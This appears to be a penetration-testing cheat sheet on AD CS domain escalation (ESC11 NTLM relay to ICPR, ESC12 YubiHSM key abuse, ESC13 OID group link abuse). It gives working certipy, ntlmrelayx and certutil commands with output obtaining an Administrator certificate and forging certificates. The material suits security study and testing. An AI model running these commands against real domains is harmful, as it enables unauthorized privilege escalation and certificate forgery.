# AD CS Domain Escalation - ESC11 to ESC13

## Relaying NTLM to ICPR - ESC11



### Explanation

If CA Server Do not configured with `IF_ENFORCEENCRYPTICERTREQUEST`, it can be makes NTLM relay attacks without signing via RPC service. [Reference in here](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/).

You can use `certipy` to enumerate if `Enforce Encryption for Requests` is Disabled and certipy will show `ESC11` Vulnerabilities.

```bash
$ certipy find -u mane@domain.local -p 'password' -dc-ip 192.168.100.100 -stdout
Certipy v4.0.0 - by Oliver Lyak (ly4k)

Certificate Authorities
  0
    CA Name                             : DC01-CA
    DNS Name                            : DC01.domain.local
    Certificate Subject                 : CN=DC01-CA, DC=domain, DC=local
    ....
    Enforce Encryption for Requests     : Disabled
    ....
    [!] Vulnerabilities
      ESC11                             : Encryption is not enforced for ICPR requests and Request Disposition is set to Issue

```

### Abuse Scenario

It need to setup a relay server:

```bash
$ certipy relay -target 'rpc://DC01.domain.local' -ca 'DC01-CA' -dc-ip 192.168.100.100
Certipy v4.7.0 - by Oliver Lyak (ly4k)

[*] Targeting rpc://DC01.domain.local (ESC11)
[*] Listening on 0.0.0.0:445
[*] Connecting to ncacn_ip_tcp:DC01.domain.local[135] to determine ICPR stringbinding
[*] Attacking user 'Administrator@DOMAIN'
[*] Template was not defined. Defaulting to Machine/User
[*] Requesting certificate for user 'Administrator' with template 'User'
[*] Requesting certificate via RPC
[*] Successfully requested certificate
[*] Request ID is 10
[*] Got certificate with UPN 'Administrator@domain.local'
[*] Certificate object SID is 'S-1-5-21-1597581903-3066826612-568686062-500'
[*] Saved certificate and private key to 'administrator.pfx'
[*] Exiting...
```

Note: For domain controllers, we must specify `-template` in DomainController.

Or using [sploutchy's fork of impacket](https://github.com/sploutchy/impacket) :

```bash
$ ntlmrelayx.py -t rpc://192.168.100.100 -rpc-mode ICPR -icpr-ca-name DC01-CA -smb2support
```



## Shell access to ADCS CA with YubiHSM - ESC12



### Explanation

Administrators can set up the Certificate Authority to store it on an external device like the "Yubico YubiHSM2".

If USB device connected to the CA server via a USB port, or a USB device server in case of the CA server is a virtual machine, an authentication key (sometimes referred to as a "password") is required for the Key Storage Provider to generate and utilize keys in the YubiHSM.

This key/password is stored in the registry under `HKEY_LOCAL_MACHINE\SOFTWARE\Yubico\YubiHSM\AuthKeysetPassword` in cleartext.

Reference in [here](https://pkiblog.knobloch.info/esc12-shell-access-to-adcs-ca-with-yubihsm).

### Abuse Scenario

If the CA's private key stored on a physical USB device when you got a shell access, it is possible to recover the key.

In first, you need to obtain the CA certificate (this is public) and then:

```cmd
# import it to the user store with CA certificate
$ certutil -addstore -user my <CA certificate file>

# Associated with the private key in the YubiHSM2 device
$ certutil -csp "YubiHSM Key Storage Provider" -repairstore -user my <CA Common Name>
```

Finally, use the certutil `-sign` command to forge a new arbitrary certificate using the CA certificate and its private key.



## OID Group Link Abuse - ESC13



### Explanation

The `msPKI-Certificate-Policy` attribute allows the issuance policy to be added to the certificate template. The `msPKI-Enterprise-Oid` objects that are responsible for issuing policies can be discovered in the Configuration Naming Context (CN=OID,CN=Public Key Services,CN=Services) of the PKI OID container. A policy can be linked to an AD group using this object's `msDS-OIDToGroupLink` attribute, enabling a system to authorize a user who presents the certificate as though he were a member of the group. [Reference in here](https://posts.specterops.io/adcs-esc13-abuse-technique-fda4272fbd53).

In other words, when a user has permission to enroll a certificate and the certificate is link to an OID group, the user can inherit the privileges of this group.

Use [Check-ADCSESC13.ps1](https://github.com/JonasBK/Powershell/blob/master/Check-ADCSESC13.ps1) to find OIDToGroupLink:

```bash
Enumerating OIDs
------------------------
OID 23541150.FCB720D24BC82FBD1A33CB406A14094D links to group: CN=VulnerableGroup,CN=Users,DC=domain,DC=local

OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
Enumerating certificate templates
------------------------
Certificate template VulnerableTemplate may be used to obtain membership of CN=VulnerableGroup,CN=Users,DC=domain,DC=local

Certificate template Name: VulnerableTemplate
OID DisplayName: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID DistinguishedName: CN=23541150.FCB720D24BC82FBD1A33CB406A14094D,CN=OID,CN=Public Key Services,CN=Services,CN=Configuration,DC=domain,DC=local
OID msPKI-Cert-Template-OID: 1.3.6.1.4.1.311.21.8.3025710.4393146.2181807.13924342.9568199.8.4253412.23541150
OID msDS-OIDToGroupLink: CN=VulnerableGroup,CN=Users,DC=domain,DC=local
------------------------
```

### Abuse Scenario

Find a user permission it can use `certipy find` or `Certify.exe find /showAllPermissions`.

If `John` have have permission to enroll `VulnerableTemplate`, the user can inherit the privileges of `VulnerableGroup` group.

All it need to do just specify the template, it will get a certificate with OIDToGroupLink rights.

```bash
certipy req -u "John@domain.local" -p "password" -dc-ip 192.168.100.100 -target "DC01.domain.local" -ca 'DC01-CA' -template 'VulnerableTemplate'
```
